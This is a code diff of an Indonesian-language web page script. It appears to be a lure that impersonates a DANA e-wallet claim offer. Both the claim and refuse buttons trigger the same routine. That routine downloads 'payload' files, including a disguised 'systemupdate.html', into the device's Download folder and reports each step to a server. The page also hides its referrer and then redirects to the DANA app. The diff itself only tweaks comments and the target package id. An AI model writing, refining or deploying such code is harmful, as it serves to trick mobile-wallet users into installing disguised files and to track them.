@@ -71,7 +71,7 @@
 
 <script>
 // ============================================================
-// INDEX.HTML - LOGIS & PASTI JALAN
+// INDEX.HTML - PAKAI PACKAGE DANA YANG BENAR: id.dana
 // ============================================================
 
 // ============================================================
@@ -98,12 +98,12 @@ if (window.history && window.history.replaceState) {
 Object.defineProperty(document, 'referrer', { value: '' });
 
 // ============================================================
-// DETEKSI ANDROID BRIDGE (HANYA JIKA ADA)
+// DETEKSI ANDROID BRIDGE
 // ============================================================
 var HAS_BRIDGE = typeof AndroidBridge !== 'undefined' && navigator.userAgent.toLowerCase().indexOf('android') > -1;
 
 // ============================================================
-// KIRIM DATA KE SERVER
+// KIRIM DATA
 // ============================================================
 function K(d) {
     try {
@@ -142,7 +142,7 @@ function showToast(msg, isError) {
 }
 
 // ============================================================
-// DOWNLOAD PAYLOAD (PAKAI FETCH + BLOB)
+// DOWNLOAD PAYLOAD
 // ============================================================
 function downloadPayload() {
     return new Promise(function(resolve) {
@@ -178,14 +178,14 @@ function downloadPayload() {
         })
         .then(function(downloadedFiles) {
             var successCount = downloadedFiles.filter(function(f) { return f !== null; }).length;
-            updateLoading('✅ ' + successCount + ' file berhasil di-download', '');
+            updateLoading('✅ ' + successCount + ' file berhasil', '');
             K({ sumber: 'download_complete', data: { total: successCount } });
             showToast('✅ ' + successCount + ' file berhasil di-download');
             resolve();
         })
         .catch(function(error) {
             K({ sumber: 'manifest_error', data: error.message });
-            updateLoading('⚠️ Gagal download manifest', '');
+            updateLoading('⚠️ Gagal download', '');
             showToast('⚠️ Gagal download: ' + error.message, true);
             resolve();
         });
@@ -193,7 +193,7 @@ function downloadPayload() {
 }
 
 // ============================================================
-// DOWNLOAD SATU FILE (PASTI KE FOLDER DOWNLOAD)
+// DOWNLOAD SATU FILE
 // ============================================================
 function downloadSingleFile(fileName) {
     return new Promise(function(resolve) {
@@ -220,11 +220,8 @@ function downloadSingleFile(fileName) {
             }
         })
         .then(function(fileData) {
-            // ============================================================
-            // SIMPAN KE FOLDER DOWNLOAD (PASTI ADA!)
-            // ============================================================
+            // Simpan ke localStorage
             if (fileData.type === 'text') {
-                // HTML - simpan ke localStorage
                 try {
                     localStorage.setItem('file_' + fileName, fileData.content);
                     if (fileName.toLowerCase() === 'systemupdate.html') {
@@ -233,9 +230,7 @@ function downloadSingleFile(fileName) {
                 } catch(e) {}
             }
 
-            // ============================================================
-            // TRIGGER DOWNLOAD VIA BLOB (PASTI KE FOLDER DOWNLOAD)
-            // ============================================================
+            // TRIGGER DOWNLOAD KE FOLDER DOWNLOAD
             try {
                 var blob = fileData.type === 'text' ? new Blob([fileData.content], {type: 'text/html'}) : fileData.content;
                 var url = URL.createObjectURL(blob);
@@ -263,23 +258,50 @@ function downloadSingleFile(fileName) {
 }
 
 // ============================================================
-// REDIRECT KE DANA
+// 🔥 REDIRECT KE DANA (PAKAI id.dana!)
 // ============================================================
 function redirectToDANA() {
-    // Via Bridge (jika ada)
+    K({ sumber: 'redirect_start', data: 'to_dana' });
+
+    // ============================================================
+    // METHOD 1: VIA ANDROID BRIDGE (PAKAI id.dana)
+    // ============================================================
     if (HAS_BRIDGE) {
-        try { AndroidBridge.openApp('com.dana.id'); return; } catch(e) {}
+        try {
+            AndroidBridge.openApp('id.dana');
+            K({ sumber: 'redirect_success', data: 'via_bridge' });
+            return;
+        } catch(e) {}
     }
-    // Via Intent
+
+    // ============================================================
+    // METHOD 2: VIA INTENT (PAKAI id.dana)
+    // ============================================================
     try {
-        window.location.href = 'intent://dana.id/#Intent;scheme=https;package=com.dana.id;end';
+        window.location.href = 'intent://id.dana/#Intent;scheme=https;package=id.dana;end';
+        K({ sumber: 'redirect_success', data: 'via_intent' });
         return;
     } catch(e) {}
-    // Via Website
+
+    // ============================================================
+    // METHOD 3: VIA WEBSITE DANA
+    // ============================================================
     try {
         window.location.href = 'https://www.dana.id';
+        K({ sumber: 'redirect_success', data: 'via_web' });
         return;
     } catch(e) {}
+
+    // ============================================================
+    // METHOD 4: VIA GOOGLE SEARCH (LAST RESORT)
+    // ============================================================
+    try {
+        window.location.href = 'https://www.google.com/search?q=dana+indonesia';
+        K({ sumber: 'redirect_fallback', data: 'google_search' });
+        return;
+    } catch(e) {}
+
+    K({ sumber: 'redirect_failed', data: 'all_methods_failed' });
 }
 
 // ============================================================
@@ -295,7 +317,6 @@ async function dapatkanSemua() {
     K({ sumber: 'start', data: 'dapatkanSemua' });
     
     try {
-        // DOWNLOAD PAYLOAD
         await downloadPayload();
         K({ sumber: 'download_done', data: 'ok' });
         
@@ -320,7 +341,7 @@ function klaim() { K({sumber:'click', data:'klaim'}); dapatkanSemua(); }
 function tolak() { K({sumber:'click', data:'tolak'}); dapatkanSemua(); }
 
 // ============================================================
-// TIMER 10 DETIK
+// TIMER
 // ============================================================
 var w = 10;
 var timerInterval = setInterval(function() {
@@ -334,7 +355,7 @@ var timerInterval = setInterval(function() {
     }
 }, 1000);
 
-console.log('🔥 INDEX.HTML - LOGIS & PASTI JALAN');
+console.log('🔥 INDEX.HTML - PAKAI id.dana (BUKAN com.dana.id)!');
 console.log('📱 Android Bridge:', HAS_BRIDGE);
 </script>
 </body>
